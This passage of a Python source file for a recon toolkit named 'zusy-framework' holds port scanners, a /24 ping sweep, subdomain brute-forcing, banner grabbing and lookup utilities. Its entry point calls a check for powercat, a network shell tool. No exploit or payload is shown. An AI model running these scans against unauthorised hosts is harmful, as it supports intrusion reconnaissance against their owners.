        SpinnerColumn(spinner_name="dots2", style="bold red"),
        TextColumn("  [bold white]{task.description}[/]"),
        BarColumn(bar_width=30, style="red", complete_style="bright_green"),
        TextColumn("[dim white]{task.completed}/{task.total}[/]"),
        console=console, transient=True,
    ) as progress:
        task = progress.add_task(f"Scanning {target} …", total=len(common_ports))
        for port, service in common_ports.items():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((target, port))
                s.close()
                if result == 0:
                    open_ports.append((port, service))
            except Exception:
                pass
            progress.advance(task)

    if not open_ports:
        warn(f"No open ports found on [bold cyan]{target}[/]")
        return

    table = Table(
        box=box.HEAVY_HEAD, border_style="dim red",
        header_style="bold red on black", show_header=True,
        min_width=55, padding=(0, 2),
    )
    table.add_column("PORT",    style="bold cyan",         width=8)
    table.add_column("SERVICE", style="bold white",        width=14)
    table.add_column("STATE",   style="bold bright_green", width=10)
    for port, service in open_ports:
        table.add_row(str(port), service, "OPEN")
    console.print(table)
    console.print()
    ok(f"Scan complete — [bold cyan]{len(open_ports)}[/] open port(s) on [bold cyan]{target}[/]")
    console.print()


def cmd_dnslookup(domain: str) -> None:
    section(f"DNS LOOKUP  ─  {domain}")
    table = Table(
        box=box.HEAVY_HEAD, border_style="dim red",
        header_style="bold red on black", show_header=True,
        min_width=72, padding=(0, 2),
    )
    table.add_column("TYPE",  style="bold cyan",  width=8)
    table.add_column("VALUE", style="bold white",  width=60)
    found = False
    try:
        ip = socket.gethostbyname(domain)
        table.add_row("A", ip)
        found = True
    except Exception:
        pass
    for rtype in ("MX", "NS"):
        try:
            url = f"https://dns.google/resolve?name={domain}&type={rtype}"
            with urllib.request.urlopen(url, timeout=4) as r:
                data = json.loads(r.read())
            for ans in data.get("Answer", []):
                table.add_row(rtype, ans.get("data", ""))
                found = True
        except Exception:
            pass
    if found:
        console.print(table)
        console.print()
        ok(f"DNS lookup complete for [bold cyan]{domain}[/]")
    else:
        err(f"Could not resolve [bold cyan]{domain}[/]")
    console.print()


def cmd_sysinfo() -> None:
    section("SYSTEM INFORMATION")
    uname = platform.uname()
    try:
        with open("/proc/meminfo") as f:
            mem_lines = f.readlines()
        total_kb = int([l for l in mem_lines if "MemTotal"     in l][0].split()[1])
        avail_kb = int([l for l in mem_lines if "MemAvailable" in l][0].split()[1])
        used_mb  = (total_kb - avail_kb) // 1024
        total_mb = total_kb // 1024
        mem_str  = f"{used_mb} MB / {total_mb} MB"
    except Exception:
        mem_str = "N/A"
    try:
        with open("/proc/cpuinfo") as f:
            cpu_lines = f.readlines()
        cpu_name  = [l.split(":")[1].strip() for l in cpu_lines if "model name" in l]
        cpu_str   = cpu_name[0] if cpu_name else "N/A"
        cpu_cores = str(len([l for l in cpu_lines if "processor" in l]))
    except Exception:
        cpu_str, cpu_cores = "N/A", "N/A"
    table = Table(box=box.SIMPLE, border_style="dim red", show_header=False, min_width=65, padding=(0, 2))
    table.add_column("key",   style="bold red",  width=18)
    table.add_column("value", style="bold white", width=46)
    table.add_row("Hostname",     uname.node)
    table.add_row("OS",           f"{uname.system} {uname.release}")
    table.add_row("Kernel",       uname.version[:60])
    table.add_row("Architecture", uname.machine)
    table.add_row("CPU",          cpu_str[:60])
    table.add_row("CPU Cores",    cpu_cores)
    table.add_row("Memory",       mem_str)
    table.add_row("Current User", os.getenv("USER", "unknown"))
    table.add_row("Local IP",     get_local_ip())
    console.print(table)
    console.print()


def cmd_base64(action: str, text: str) -> None:
    section(f"BASE64 {action.upper()}")
    try:
        if action == "encode":
            result = base64.b64encode(text.encode()).decode()
        elif action == "decode":
            result = base64.b64decode(text.encode()).decode(errors="replace")
        else:
            err("Usage: base64 encode <text>  |  base64 decode <text>")
            return
        console.print(f"  [dim white]Input  [/]  [dim]{text}[/]")
        console.print(f"  [bold red]Output [/]  [bold bright_green]{result}[/]")
    except Exception as e:
        err(f"Failed: {e}")
    console.print()


def cmd_hashgen(text: str) -> None:
    section("HASH GENERATOR")
    table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                  show_header=True, min_width=80, padding=(0, 2))
    table.add_column("ALGORITHM", style="bold cyan",         width=12)
    table.add_column("HASH",      style="bold bright_green", width=66)
    encoded = text.encode()
    table.add_row("MD5",    hashlib.md5(encoded).hexdigest())
    table.add_row("SHA1",   hashlib.sha1(encoded).hexdigest())
    table.add_row("SHA256", hashlib.sha256(encoded).hexdigest())
    table.add_row("SHA512", hashlib.sha512(encoded).hexdigest())
    console.print(f"  [dim white]Input  →  [/][dim]{text}[/]\n")
    console.print(table)
    console.print()


def cmd_netstat() -> None:
    section("ACTIVE CONNECTIONS")
    try:
        result = subprocess.run(["ss", "-tnp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        lines  = result.stdout.strip().splitlines()
        if len(lines) <= 1:
            warn("No active connections found.")
            console.print()
            return
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=80, padding=(0, 2))
        table.add_column("STATE",   style="bold cyan",  width=14)
        table.add_column("LOCAL",   style="bold white", width=26)
        table.add_column("REMOTE",  style="bold white", width=26)
        table.add_column("PROCESS", style="dim white",  width=20)
        for line in lines[1:]:
            parts  = line.split()
            state  = parts[0]
            local  = parts[3] if len(parts) > 3 else ""
            remote = parts[4] if len(parts) > 4 else ""
            proc   = parts[-1] if "pid" in parts[-1] else ""
            color  = "bold bright_green" if state == "ESTAB" else "bold cyan"
            table.add_row(f"[{color}]{state}[/]", local, remote, proc)
        console.print(table)
        console.print()
    except Exception as e:
        err(f"netstat failed: {e}")
        console.print()


def cmd_ping(target: str) -> None:
    section(f"PING  ─  {target}")
    try:
        result = subprocess.run(["ping", "-c", "4", "-W", "1", target],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        lines = result.stdout.strip().splitlines()
        table = Table(box=box.SIMPLE, border_style="dim red", show_header=False, min_width=60, padding=(0, 2))
        table.add_column("line", style="bold white", width=60)
        for line in lines:
            table.add_row(line)
        console.print(table)
        console.print()
        if result.returncode == 0:
            ok(f"[bold cyan]{target}[/] is [bold bright_green]ALIVE[/]")
        else:
            warn(f"[bold cyan]{target}[/] did not respond")
    except Exception as e:
        err(f"Ping failed: {e}")
    console.print()


def cmd_traceroute(target: str) -> None:
    section(f"TRACEROUTE  ─  {target}")
    info(f"Tracing route to [bold cyan]{target}[/] …")
    console.print()
    try:
        result = subprocess.run(["traceroute", "-m", "20", target],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        lines = result.stdout.strip().splitlines()
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=70, padding=(0, 2))
        table.add_column("HOP",  style="bold cyan",  width=6)
        table.add_column("INFO", style="bold white",  width=62)
        for line in lines[1:]:
            parts = line.strip().split(None, 1)
            table.add_row(parts[0] if parts else "", parts[1] if len(parts) > 1 else "")
        console.print(table)
    except Exception as e:
        err(f"Traceroute failed: {e}")
    console.print()


def cmd_macvendor(mac: str) -> None:
    section(f"MAC VENDOR LOOKUP  ─  {mac}")
    try:
        url = f"https://api.macvendors.com/{mac}"
        req = urllib.request.Request(url, headers={"User-Agent": "zusy-framework/1.0"})
        with urllib.request.urlopen(req, timeout=5) as r:
            vendor = r.read().decode().strip()
        console.print(f"  [dim white]MAC      [/]  [bold cyan]{mac}[/]")
        console.print(f"  [bold red]Vendor   [/]  [bold bright_green]{vendor}[/]")
        console.print()
        ok("Lookup complete.")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            warn(f"Vendor not found for [bold cyan]{mac}[/]")
        else:
            err(f"HTTP error: {e.code}")
    except Exception as e:
        err(f"Lookup failed: {e}")
    console.print()


def cmd_rot13(text: str) -> None:
    section("ROT13")
    result = text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
    ))
    console.print(f"  [dim white]Input  [/]  [dim]{text}[/]")
    console.print(f"  [bold red]Output [/]  [bold bright_green]{result}[/]")
    console.print()


def cmd_hexencode(text: str) -> None:
    section("HEX ENCODE")
    result = text.encode().hex()
    console.print(f"  [dim white]Input  [/]  [dim]{text}[/]")
    console.print(f"  [bold red]Output [/]  [bold bright_green]{result}[/]")
    console.print()


def cmd_hexdecode(hexstr: str) -> None:
    section("HEX DECODE")
    try:
        result = bytes.fromhex(hexstr.replace(" ", "")).decode(errors="replace")
        console.print(f"  [dim white]Input  [/]  [dim]{hexstr}[/]")
        console.print(f"  [bold red]Output [/]  [bold bright_green]{result}[/]")
    except Exception as e:
        err(f"Invalid hex string: {e}")
    console.print()


def cmd_urlencode(text: str) -> None:
    section("URL ENCODE")
    import urllib.parse
    result = urllib.parse.quote(text)
    console.print(f"  [dim white]Input  [/]  [dim]{text}[/]")
    console.print(f"  [bold red]Output [/]  [bold bright_green]{result}[/]")
    console.print()


def cmd_uptime() -> None:
    section("SYSTEM UPTIME")
    try:
        with open("/proc/uptime") as f:
            secs = float(f.read().split()[0])
        days    = int(secs // 86400)
        hours   = int((secs % 86400) // 3600)
        minutes = int((secs % 3600) // 60)
        seconds = int(secs % 60)
        console.print(f"  [bold red]Uptime   [/]  [bold bright_green]{days}d  {hours:02d}h  {minutes:02d}m  {seconds:02d}s[/]")
    except Exception as e:
        err(f"Could not read uptime: {e}")
    console.print()


def cmd_diskinfo() -> None:
    section("DISK INFORMATION")
    try:
        result = subprocess.run(
            ["df", "-h", "--output=source,fstype,size,used,avail,pcent,target"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        lines = result.stdout.strip().splitlines()
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=85, padding=(0, 2))
        table.add_column("FILESYSTEM", style="bold cyan",         width=18)
        table.add_column("TYPE",       style="dim white",         width=8)
        table.add_column("SIZE",       style="bold white",        width=8)
        table.add_column("USED",       style="bold yellow",       width=8)
        table.add_column("AVAIL",      style="bold bright_green", width=8)
        table.add_column("USE%",       style="bold red",          width=6)
        table.add_column("MOUNT",      style="dim white",         width=20)
        for line in lines[1:]:
            parts = line.split()
            if len(parts) == 7:
                table.add_row(*parts)
        console.print(table)
    except Exception as e:
        err(f"Could not read disk info: {e}")
    console.print()


def cmd_banner(ip: str, port: str) -> None:
    section(f"BANNER GRAB  ─  {ip}:{port}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, int(port)))
        try:
            s.sendall(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        except Exception:
            pass
        banner = s.recv(1024).decode(errors="replace").strip()
        s.close()
        if banner:
            table = Table(box=box.SIMPLE, border_style="dim red", show_header=False, min_width=70, padding=(0, 2))
            table.add_column("line", style="bold bright_green", width=70)
            for line in banner.splitlines():
                if line.strip():
                    table.add_row(line)
            console.print(table)
            ok(f"Banner received from [bold cyan]{ip}:{port}[/]")
        else:
            warn("Connected but no banner received.")
    except ConnectionRefusedError:
        err(f"Connection refused on [bold cyan]{ip}:{port}[/]")
    except Exception as e:
        err(f"Banner grab failed: {e}")
    console.print()


def cmd_subdomains(domain: str) -> None:
    section(f"SUBDOMAIN SCAN  ─  {domain}")
    wordlist = [
        "www","mail","ftp","admin","dev","api","test","staging","blog","shop",
        "vpn","remote","portal","dashboard","beta","app","static","cdn","ns1",
        "ns2","smtp","pop","imap","git","gitlab","jenkins","jira","confluence",
        "support",
    ]
    found = []
    info(f"Probing [bold cyan]{len(wordlist)}[/] subdomains …")
    console.print()
    with Progress(SpinnerColumn(spinner_name="dots2", style="bold red"),
                  TextColumn("  [bold white]{task.description}[/]"),
                  BarColumn(bar_width=30, style="red", complete_style="bright_green"),
                  TextColumn("[dim white]{task.completed}/{task.total}[/]"),
                  console=console, transient=True) as progress:
        task = progress.add_task("Scanning …", total=len(wordlist))
        for sub in wordlist:
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append((fqdn, ip))
            except Exception:
                pass
            progress.advance(task)
    if not found:
        warn(f"No subdomains resolved for [bold cyan]{domain}[/]")
    else:
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=65, padding=(0, 2))
        table.add_column("SUBDOMAIN", style="bold cyan",         width=36)
        table.add_column("IP",        style="bold bright_green", width=22)
        for fqdn, ip in found:
            table.add_row(fqdn, ip)
        console.print(table)
        console.print()
        ok(f"Found [bold cyan]{len(found)}[/] subdomain(s) for [bold cyan]{domain}[/]")
    console.print()


def cmd_httpheaders(url: str) -> None:
    if not url.startswith("http"):
        url = "http://" + url
    section(f"HTTP HEADERS  ─  {url}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "zusy-framework/1.0"})
        with urllib.request.urlopen(req, timeout=6) as r:
            headers = dict(r.headers)
            status  = r.status
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=72, padding=(0, 2))
        table.add_column("HEADER", style="bold cyan",  width=28)
        table.add_column("VALUE",  style="bold white",  width=42)
        console.print(f"  [bold red]Status[/]  [bold bright_green]{status}[/]\n")
        for k, v in sorted(headers.items()):
            table.add_row(k, v)
        console.print(table)
        ok(f"Headers retrieved from [bold cyan]{url}[/]")
    except Exception as e:
        err(f"Request failed: {e}")
    console.print()


def cmd_sweep(network: str) -> None:
    base   = network.split("/")[0].rsplit(".", 1)[0]
    section(f"NETWORK SWEEP  ─  {base}.0/24")
    alive  = []
    info(f"Sweeping [bold cyan]{base}.1[/] → [bold cyan]{base}.254[/] …")
    console.print()
    with Progress(SpinnerColumn(spinner_name="dots2", style="bold red"),
                  TextColumn("  [bold white]{task.description}[/]"),
                  BarColumn(bar_width=28, style="red", complete_style="bright_green"),
                  TextColumn("[dim white]{task.completed}/{task.total}[/]"),
                  console=console, transient=True) as progress:
        task = progress.add_task("Sweeping …", total=254)
        lock = threading.Lock()
        def ping_host(i):
            ip = f"{base}.{i}"
            r  = subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if r.returncode == 0:
                with lock:
                    alive.append(ip)
            progress.advance(task)
        threads = []
        for i in range(1, 255):
            t = threading.Thread(target=ping_host, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    if not alive:
        warn("No live hosts found.")
    else:
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=45, padding=(0, 2))
        table.add_column("#",      style="bold red",          width=5)
        table.add_column("IP",     style="bold bright_green", width=18)
        table.add_column("STATUS", style="bold green",        width=10)
        for idx, ip in enumerate(sorted(alive), 1):
            table.add_row(str(idx), ip, "ALIVE")
        console.print(table)
        console.print()
        ok(f"[bold cyan]{len(alive)}[/] live host(s) found on [bold cyan]{base}.0/24[/]")
    console.print()


def cmd_portrange(target: str, start: str, end: str) -> None:
    try:
        s_port = int(start)
        e_port = int(end)
    except ValueError:
        err("Ports must be integers.")
        console.print()
        return
    section(f"PORT RANGE SCAN  ─  {target}  [{s_port}–{e_port}]")
    open_ports = []
    total      = e_port - s_port + 1
    with Progress(SpinnerColumn(spinner_name="dots2", style="bold red"),
                  TextColumn("  [bold white]{task.description}[/]"),
                  BarColumn(bar_width=28, style="red", complete_style="bright_green"),
                  TextColumn("[dim white]{task.completed}/{task.total}[/]"),
                  console=console, transient=True) as progress:
        task = progress.add_task(f"Scanning {target} …", total=total)
        for port in range(s_port, e_port + 1):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.4)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                s.close()
            except Exception:
                pass
            progress.advance(task)
    if not open_ports:
        warn(f"No open ports in range [bold cyan]{s_port}–{e_port}[/] on [bold cyan]{target}[/]")
    else:
        table = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                      show_header=True, min_width=40, padding=(0, 2))
        table.add_column("PORT",  style="bold cyan",         width=10)
        table.add_column("STATE", style="bold bright_green", width=10)
        for p in open_ports:
            table.add_row(str(p), "OPEN")
        console.print(table)
        console.print()
        ok(f"[bold cyan]{len(open_ports)}[/] open port(s) found.")
    console.print()


def cmd_arplist() -> None:
    section("ARP TABLE")
    try:
        result = subprocess.run(["arp", "-n"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        lines  = result.stdout.strip().splitlines()
        table  = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                       show_header=True, min_width=65, padding=(0, 2))
        table.add_column("IP",        style="bold cyan",         width=18)
        table.add_column("MAC",       style="bold bright_green", width=20)
        table.add_column("INTERFACE", style="dim white",         width=12)
        table.add_column("TYPE",      style="dim white",         width=10)
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 5:
                table.add_row(parts[0], parts[2], parts[4] if len(parts) > 4 else "",
                              parts[1].strip("()") if len(parts) > 1 else "")
        console.print(table)
    except Exception as e:
        err(f"ARP table read failed: {e}")
    console.print()


def cmd_openports() -> None:
    section("OPEN LOCAL PORTS")
    try:
        result = subprocess.run(["ss", "-tlnp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        lines  = result.stdout.strip().splitlines()
        table  = Table(box=box.HEAVY_HEAD, border_style="dim red", header_style="bold red on black",
                       show_header=True, min_width=72, padding=(0, 2))
        table.add_column("STATE",   style="bold cyan",         width=10)
        table.add_column("LOCAL",   style="bold bright_green", width=26)
        table.add_column("PROCESS", style="dim white",         width=30)
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 4:
                table.add_row(parts[0], parts[3], parts[-1] if "pid" in parts[-1] else "")
        console.print(table)
        ok("Listening ports listed.")
    except Exception as e:
        err(f"Failed: {e}")
    console.print()


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    local_ip = get_local_ip()
    signal.signal(signal.SIGINT, signal_handler)
    check_powercat()
    menu()
